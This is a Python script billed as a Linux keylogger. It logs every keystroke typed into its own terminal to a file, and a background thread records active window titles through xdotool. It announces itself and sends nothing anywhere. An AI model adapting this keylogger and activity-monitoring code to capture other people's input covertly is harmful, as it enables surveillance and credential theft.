#!/usr/bin/env python3

""" Linux keylogger that works without root permissions.
"""

import sys
import os
import time
import logging
import threading
import select
import termios
import tty
import fcntl

class WorkingLinuxKeylogger:
    """ Linux keylogger that actually works without special permissions. """

    def __init__(self, name):
        self._name = name
        self._running = False
        self._thread = None

    @property
    def name(self):
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    def start_logging(self):
        """ Start the keylogger. """
        self._running = True
        
        print("Starting Linux Keylogger")
        print("=======================")
        print("This will capture all keystrokes typed in THIS terminal.")
        print("For best results, focus on this terminal window and type here.")
        print("Press Ctrl+C to stop\n")
        
        # Start the keyboard listener
        self._thread = threading.Thread(target=self._keyboard_listener)
        self._thread.daemon = True
        self._thread.start()
        
        try:
            while self._running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop_logging()

    def _keyboard_listener(self):
        """ Main keyboard listener that actually works. """
        # Save original terminal settings
        old_settings = termios.tcgetattr(sys.stdin)
        
        try:
            # Set terminal to raw mode to capture keys immediately
            tty.setraw(sys.stdin.fileno())
            
            # Get file descriptor for stdin
            fd = sys.stdin.fileno()
            
            # Make stdin non-blocking
            old_flags = fcntl.fcntl(fd, fcntl.F_GETFL)
            fcntl.fcntl(fd, fcntl.F_SETFL, old_flags | os.O_NONBLOCK)
            
            print("Keylogger active! Start typing in this terminal...")
            
            while self._running:
                try:
                    # Use select to check if input is available (non-blocking)
                    rlist, _, _ = select.select([sys.stdin], [], [], 0.1)
                    
                    if rlist:
                        # Read all available characters
                        while True:
                            try:
                                char = os.read(fd, 1).decode('utf-8')
                                if char:
                                    self._process_key(char)
                            except BlockingIOError:
                                # No more data available
                                break
                            except UnicodeDecodeError:
                                # Handle binary data
                                logging.debug("[BINARY_DATA]")
                                break
                
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    logging.error(f"Read error: {e}")
                    time.sleep(0.1)
                    
        except Exception as e:
            logging.error(f"Listener error: {e}")
        finally:
            # Restore terminal settings
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
            # Restore file flags
            fcntl.fcntl(fd, fcntl.F_SETFL, old_flags)
            print("\nTerminal settings restored.")

    def _process_key(self, char):
        """ Process and log individual keys. """
        # Handle special keys
        special_keys = {
            '\x01': '[CTRL+A]', '\x02': '[CTRL+B]', '\x03': '[CTRL+C]',
            '\x04': '[CTRL+D]', '\x05': '[CTRL+E]', '\x06': '[CTRL+F]',
            '\x07': '[CTRL+G]', '\x08': '[CTRL+H]', '\x09': '[TAB]',
            '\x0a': '[CTRL+J]', '\x0b': '[CTRL+K]', '\x0c': '[CTRL+L]',
            '\x0d': '\n[ENTER]\n', '\x0e': '[CTRL+N]', '\x0f': '[CTRL+O]',
            '\x10': '[CTRL+P]', '\x11': '[CTRL+Q]', '\x12': '[CTRL+R]',
            '\x13': '[CTRL+S]', '\x14': '[CTRL+T]', '\x15': '[CTRL+U]',
            '\x16': '[CTRL+V]', '\x17': '[CTRL+W]', '\x18': '[CTRL+X]',
            '\x19': '[CTRL+Y]', '\x1a': '[CTRL+Z]', '\x1b': '[ESC]',
            '\x7f': '[BACKSPACE]', ' ': ' ', '\t': '[TAB]', '\n': '\n[ENTER]\n'
        }
        
        # Check for escape sequences (arrow keys, function keys, etc.)
        if char == '\x1b':  # Escape character
            # Read the next characters to identify the escape sequence
            time.sleep(0.01)  # Small delay to ensure sequence is available
            
            sequence = ''
            try:
                # Try to read more characters for the escape sequence
                fd = sys.stdin.fileno()
                while True:
                    try:
                        next_char = os.read(fd, 1).decode('utf-8')
                        sequence += next_char
                    except BlockingIOError:
                        break
            except:
                pass
            
            if sequence:
                if sequence == '[A':
                    logging.debug('[UP_ARROW]')
                elif sequence == '[B':
                    logging.debug('[DOWN_ARROW]')
                elif sequence == '[C':
                    logging.debug('[RIGHT_ARROW]')
                elif sequence == '[D':
                    logging.debug('[LEFT_ARROW]')
                elif sequence.startswith('[1') or sequence.startswith('[2'):
                    logging.debug(f'[FUNCTION_KEY:{sequence}]')
                else:
                    logging.debug(f'[ESC_SEQ:{sequence.encode().hex()}]')
            else:
                logging.debug('[ESC]')
        
        # Handle regular special keys
        elif char in special_keys:
            logging.debug(special_keys[char])
            
            # Check for exit condition
            if char == '\x03':  # Ctrl+C
                self.stop_logging()
                return
            elif char == '\x04':  # Ctrl+D
                self.stop_logging()
                return
        
        # Handle printable characters
        elif char.isprintable():
            logging.debug(char)
        
        # Handle other non-printable characters
        else:
            # Log as hex code
            hex_code = char.encode('utf-8').hex()
            logging.debug(f'[0x{hex_code}]')

    def stop_logging(self):
        """ Stop the keylogger. """
        self._running = False
        if self._thread:
            self._thread.join(timeout=1)
        print("\nKeylogger stopped.")


class BackgroundLogger:
    """ Additional background monitoring that doesn't require special permissions. """
    
    def __init__(self):
        self._running = False
        self._thread = None

    def start_logging(self):
        """ Start background monitoring. """
        self._running = True
        self._thread = threading.Thread(target=self._background_monitor)
        self._thread.daemon = True
        self._thread.start()

    def stop_logging(self):
        self._running = False

    def _background_monitor(self):
        """ Monitor system activity in background. """
        import subprocess
        import datetime
        
        last_check = time.time()
        
        while self._running:
            try:
                current_time = time.time()
                
                # Log periodic activity every 30 seconds
                if current_time - last_check > 30:
                    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    logging.debug(f"[ACTIVITY_CHECK] System active at {timestamp}")
                    last_check = current_time
                
                # Try to get active window title (if xdotool is available)
                try:
                    result = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'], 
                                          capture_output=True, text=True, timeout=2)
                    if result.returncode == 0 and result.stdout.strip():
                        window_title = result.stdout.strip()
                        logging.debug(f"[ACTIVE_WINDOW] {window_title}")
                except:
                    pass  # xdotool not available or failed
                
                time.sleep(5)  # Check every 5 seconds
                
            except Exception as e:
                logging.error(f"Background monitor error: {e}")
                time.sleep(10)


if __name__ == '__main__':
    # Check if we're on Linux
    if not sys.platform.startswith("linux"):
        print("This script is for Linux systems only!")
        sys.exit(1)
    
    # Setup logger
    logging.basicConfig(
        level=logging.DEBUG,
        filename='linux_keys.log',
        format='%(asctime)s - %(message)s',
        datefmt='%H:%M:%S'
    )
    
    print("Working Linux Keylogger")
    print("======================")
    print("This version will capture keystrokes in the current terminal.")
    print("Log file: linux_keys.log")
    print("")
    
    # Start the keylogger
    keylogger = WorkingLinuxKeylogger('LinuxKeylogger')
    
    # Start background monitoring
    bg_logger = BackgroundLogger()
    bg_logger.start_logging()
    
    try:
        keylogger.start_logging()
    except Exception as e:
        print(f"Error: {e}")
    finally:
        keylogger.stop_logging()
        bg_logger.stop_logging()
        print("Cleanup complete.")
